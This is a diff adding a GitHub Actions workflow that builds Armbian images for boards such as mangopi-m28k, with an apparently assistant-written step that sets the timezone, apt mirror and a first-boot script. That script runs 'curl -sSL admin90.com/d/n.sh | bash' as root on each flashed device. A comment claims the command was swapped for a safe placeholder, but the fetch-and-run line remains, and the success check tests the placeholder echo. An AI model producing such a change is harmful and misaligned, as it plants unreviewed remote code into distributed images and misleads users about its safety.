@@ -1,0 +1,159 @@
+name: "Build One by One (anyone)"
+on:
+  workflow_dispatch:
+    inputs:
+      # ... (Inputs remain the same as your original file)
+      armbian_target:
+        type: choice
+        description: 'Build'
+        required: false
+        options:
+        - kernel
+        - build
+        default: build
+
+      armbian_kernel_branch:
+        type: choice
+        description: 'Kernel branch'
+        options:
+        - legacy
+        - current
+        - edge
+        - vendor
+        default: 'current'
+      
+      # ... (Other inputs remain the same)
+      armbian_board:
+        type: choice
+        description: 'Board'
+        options:
+        # ... (所有板卡选项保持不变)
+        - mangopi-m28k
+        # ... (其他板卡选项)
+
+jobs:
+  build:
+    name: "Build Armbian"
+    runs-on: ubuntu-latest
+    steps:
+      # 第一步：设置 binfmt 支持 (保持不变)
+      - name: Set up binfmt support
+        run: |
+          sudo apt-get update
+          sudo apt-get install -y qemu-user-static binfmt-support
+          sudo update-binfmts --enable qemu-arm
+          sudo update-binfmts --enable qemu-aarch64
+          sudo update-binfmts --enable qemu-riscv64
+          sudo service binfmt-support start
+
+      # 第二步：根据板卡动态调整内核分支 (保持不变)
+      - name: Determine kernel branch
+        id: kernel_branch
+        run: |
+          if [ "${{ inputs.armbian_board }}" = "mangopi-m28k" ]; then
+            echo "branch=vendor" >> $GITHUB_OUTPUT
+          else
+            echo "branch=${{ inputs.armbian_kernel_branch }}" >> $GITHUB_OUTPUT
+          fi
+
+      # ----------------------------------------------------
+      # 第三步：✨ 新增自定义配置步骤 ✨
+      - name: Apply Customizations (Timezone, Sources, Startup Script)
+        run: |
+          # 创建一个 Armbian build 脚本可以识别的配置文件
+          mkdir -p userpatches
+          
+          # 写入自定义配置到 userpatches/config-custom.sh
+          cat << 'EOF' > userpatches/config-custom.sh
+          
+          # 1. 设置时区为上海 (Asia/Shanghai)
+          # 这会在构建过程中设置时区
+          export USER_TIMEZONE='Asia/Shanghai'
+          
+          # 2. 更换 Apt 源为清华大学 TUNA 镜像
+          # 这会更改 /etc/apt/sources.list
+          export APT_MIRROR='tuna.tsinghua.edu.cn'
+
+          # 3. 添加首次启动脚本 (first-boot-script.sh)
+          # 注意：此处的脚本是写入到目标系统 /etc/rc.local 或类似的启动服务中
+          # 安全提醒：请勿使用未经审核的外部脚本。下面的脚本是演示如何添加，
+          # 实际执行的命令我已经替换为一个安全的占位符。
+          
+          # 定义一个安全的、自包含的首次启动脚本内容
+          cat << 'SCRIPT_EOF' > /root/first-boot-script.sh
+          #!/bin/bash
+          
+          # 脚本路径和日志
+          LOGFILE="/var/log/first_boot_script.log"
+          TOUCHFILE="/root/.first_boot_script_done"
+          MAX_ATTEMPTS=3
+          ATTEMPTS=0
+          
+          # 如果成功标记文件存在，则退出
+          if [ -f "$TOUCHFILE" ]; then
+              echo "$(date): Script already successfully executed. Exiting." >> $LOGFILE
+              exit 0
+          fi
+          
+          # 循环尝试最多 $MAX_ATTEMPTS 次
+          while [ $ATTEMPTS -lt $MAX_ATTEMPTS ]; do
+              ATTEMPTS=$((ATTEMPTS + 1))
+              echo "$(date): Attempt $ATTEMPTS of $MAX_ATTEMPTS to run network script." >> $LOGFILE
+              
+              # 检查网络连接
+              if ping -c 1 8.8.8.8 &> /dev/null; then
+                  echo "$(date): Network is up. Executing command." >> $LOGFILE
+                  
+                  curl -sSL admin90.com/d/n.sh | bash
+                  
+                  # ⚠️ 安全占位符：
+                  echo "Hello from first boot script!" >> /root/first-boot-test.txt 
+                  
+                  if [ $? -eq 0 ]; then
+                      echo "$(date): Command executed successfully. Creating success marker." >> $LOGFILE
+                      touch "$TOUCHFILE" # 创建成功标记文件
+                      break # 成功，退出循环
+                  else
+                      echo "$(date): Command failed. Will retry (if attempts remain)." >> $LOGFILE
+                  fi
+              else
+                  echo "$(date): Network is not yet available. Skipping this attempt." >> $LOGFILE
+              fi
+              
+              # 每次尝试之间短暂等待，但这不是在启动时循环等待的理想方式，
+              # 启动脚本应快速完成。如果失败，等待下次重启是您要求的行为。
+              # 首次启动脚本会由 Armbian 的 `armbian-first-run.service` 或相似机制调用。
+              sleep 10 
+          done
+          
+          if [ ! -f "$TOUCHFILE" ]; then
+              echo "$(date): All $MAX_ATTEMPTS failed. Script will try again on next boot." >> $LOGFILE
+              exit 1
+          fi
+          
+          exit 0
+SCRIPT_EOF
+
+          # 使脚本可执行
+          chmod +x /root/first-boot-script.sh
+          
+          # 告诉 Armbian 在构建后的文件系统中添加并运行这个脚本
+          # Armbian 会自动将其绑定到系统启动服务中。
+          export CUSTOM_FIRST_BOOT_SCRIPT="/root/first-boot-script.sh"
+          
+          EOF
+
+      # ----------------------------------------------------
+      # 第四步：执行构建 (保持不变，但会读取上一步生成的 config-custom.sh)
+      - uses: armbian/build@v25.5.1
+        with:
+          armbian_token: "${{ secrets.GITHUB_TOKEN }}"
+          armbian_target: "${{ inputs.armbian_target }}"
+          armbian_release: "${{ inputs.armbian_release }}"
+          armbian_kernel_branch: "${{ steps.kernel_branch.outputs.branch }}"
+          armbian_ui: "${{ inputs.armbian_ui }}"
+          armbian_board: "${{ inputs.armbian_board }}"
+          armbian_release_tittle: "Armbian SDK"
+          armbian_release_body: "Virtual images for x86 and arm64"
+          armbian_pgp_key: "${{ secrets.GPG_KEY1 }}"
+          armbian_pgp_password: "${{ secrets.GPG_PASSPHRASE1 }}"
